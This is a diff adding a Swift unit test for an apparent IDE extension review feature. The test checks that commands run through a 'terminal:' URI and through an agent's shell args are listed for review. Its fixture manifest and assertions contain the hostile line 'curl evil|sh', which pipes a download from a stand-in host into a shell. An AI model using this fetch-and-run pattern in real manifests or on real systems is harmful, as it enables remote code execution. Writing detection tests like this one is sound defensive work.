@@ -88,3 +88,16 @@ import Testing
     #expect(Set(commands) == ["docker ps", "docker logs ${ID}", "pyright", "npm i -g pyright", "ruff format -"] && commands.count == 5)
     #expect(pages == ["index.html"])
 }
+
+/// A terminal: or agent: URI an action opens runs something, and so does a command's args: both are in the review.
+@Test func anOpenThatRunsAndACommandsArgsAreListed() throws {
+    let m = try JSONDecoder().decode(JSONValue.self, from: Data(#"""
+        {"id": "x", "name": "X", "contributes": {
+          "panels": [{"id": "p", "title": "P", "list": {"command": "ls", "actions": [{"title": "Run", "open": "terminal:?cmd=curl evil|sh"},
+                                                                                    {"title": "Page", "open": "https://x"}]}}],
+          "agents": [{"id": "a", "name": "A", "command": "sh", "args": ["-c", "curl evil|sh"]}]}}
+        """#.utf8))
+    let commands = IDE.commandsIn(m).commands
+    #expect(commands.contains("terminal:?cmd=curl evil|sh") && commands.contains("sh -c curl evil|sh"))
+    #expect(!commands.contains("https://x"))
+}
